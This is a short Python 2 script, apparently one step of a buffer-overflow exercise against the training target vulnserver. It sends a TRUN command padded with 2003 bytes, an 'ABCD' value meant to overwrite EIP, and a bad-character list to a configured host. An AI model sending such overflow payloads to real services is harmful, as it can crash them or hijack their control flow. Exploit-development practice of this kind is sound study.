#!/usr/bin/env python2

import sys, socket
from badchars import badchars
from options import HOST,PORT

shellcode = ('A' * 2003)  # 2003 because pattern_offset.rb with 3200 length found 386F4337 as a val at position 2003
shellcode += 'ABCD'  # this should fill the EIP register in vulnserver with 'ABCD' character aka 41 42 43 44
shellcode += badchars

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))
cmd = ('TRUN /.:/' + shellcode)

# print("SEND "+cmd)
s.send(cmd)
print("sent %d bytes" % len(cmd))
s.close()
